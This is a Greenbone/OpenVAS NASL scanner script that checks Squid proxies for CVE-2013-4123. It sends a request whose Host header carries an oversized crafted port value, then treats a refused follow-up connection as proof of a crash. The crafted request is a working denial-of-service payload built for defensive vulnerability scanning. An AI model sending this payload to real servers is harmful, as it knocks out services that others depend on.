CPE = "cpe:/a:squid-cache:squid";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802057" );
	script_version( "$Revision: 13659 $" );
	script_cve_id( "CVE-2013-4123" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $" );
	script_tag( name: "creation_date", value: "2013-08-12 12:42:47 +0530 (Mon, 12 Aug 2013)" );
	script_name( "Squid Proxy Host Header Denial Of Service Vulnerability" );
	script_tag( name: "summary", value: "This host is running Squid Proxy Server and is prone to Denial Of Service
vulnerability." );
	script_tag( name: "vuldetect", value: "Send crafted 'Host' header request and check is it vulnerable to DoS or not." );
	script_tag( name: "solution", value: "Upgrade to Squid Version 3.2.13 or 3.3.8 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "insight", value: "Error when handling port number values within the 'Host' header of HTTP
requests." );
	script_tag( name: "affected", value: "Squid Version 3.2 through 3.2.12 and versions 3.3 through 3.3.7" );
	script_tag( name: "impact", value: "Successful exploitation could allow remote attackers to cause a denial of
service via a crafted port number values in the 'Host' header." );
	script_xref( name: "URL", value: "http://www.scip.ch/en/?vuldb.9547" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/54142" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2013/Jul/98" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/527294" );
	script_xref( name: "URL", value: "http://www.squid-cache.org/Advisories/SQUID-2013_3.txt" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "This script is Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "secpod_squid_detect.sc" );
	script_mandatory_keys( "squid_proxy_server/installed" );
	script_require_ports( "Services/www", "Services/http_proxy", 3128, 8080 );
	script_xref( name: "URL", value: "http://www.squid-cache.org/Download" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
squid_port = get_app_port( cpe: CPE );
if(!squid_port){
	exit( 0 );
}
useragent = http_get_user_agent();
crafted_port_value = crap( length: 2000, data: "AZ" );
crafted_req = NASLString( "HEAD http://testhostdoesnotexists.com HTTP/1.1\\r\\n", "Host: ", "testhostdoesnotexists.com", ":", crafted_port_value, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "\\r\\n" );
crafted_res = http_send_recv( port: squid_port, data: crafted_req );
sleep( 3 );
soc = http_open_socket( squid_port );
if(!soc){
	security_message( port: squid_port );
	exit( 0 );
}
http_close_socket( soc );

